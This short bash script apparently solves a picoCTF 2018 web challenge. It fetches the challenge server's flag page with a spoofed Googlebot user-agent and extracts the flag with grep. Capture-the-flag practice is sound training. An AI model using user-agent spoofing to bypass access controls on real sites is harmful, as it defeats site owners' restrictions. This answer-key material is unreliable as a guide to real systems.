#!/bin/bash

# technically only need "Googlebot"
curl -s http://2018shell.picoctf.com:3827/flag --user-agent "Googlebot-Image/1.0" | grep -oE "picoCTF{.*}"

